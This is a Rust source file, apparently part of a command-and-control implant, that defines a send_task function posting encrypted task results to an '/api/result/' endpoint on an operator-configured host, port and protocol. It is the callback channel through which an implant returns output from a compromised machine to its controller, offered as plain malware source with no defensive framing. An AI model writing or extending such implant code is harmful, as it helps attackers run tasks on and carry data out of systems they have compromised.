use reqwest;

use crate::{errors::ImplantError, HOST, PORT, PROTOCOL};

const SEND_TASK_ENDPOINT: &str = "/api/result/";

pub fn send_task(task_id: &String, encrypted_response: String) -> Result<String, ImplantError> {
    let full_url = format!(
        "{}://{}:{}{}{}",
        PROTOCOL, HOST, PORT, SEND_TASK_ENDPOINT, task_id
    );

    let client = reqwest::blocking::Client::new();

    let response = client
        .post(full_url)
        .body(encrypted_response)
        .send()?
        .text()?;

    Ok(response)
}
